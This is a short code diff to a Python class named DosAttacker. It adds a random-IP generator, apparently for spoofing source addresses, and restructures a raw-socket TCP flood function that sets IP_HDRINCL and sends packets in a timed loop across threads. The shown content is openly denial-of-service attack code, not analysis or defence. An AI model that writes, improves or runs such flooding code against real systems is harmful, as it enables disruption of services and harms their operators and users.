@@ -15,9 +15,12 @@ class DosAttacker:
         self.duration = duration
         self.stop_attack = False
 
+    def generate_random_ip(self) -> str:
+        return f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"
+
     def tcp_flood(self):
+        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
         try:
-            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
             sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
             end_time = time.time() + self.duration
             while time.time() < end_time and not self.stop_attack:
@@ -35,7 +38,7 @@ class DosAttacker:
         finally:
             sock.close()
 
-    def start_attack(self, attack_type: str = "both"):
+    def start_attack(self, attack_type):
         threads = []
         if attack_type.lower() in ["tcp"]:
             # Start TCP flood threads
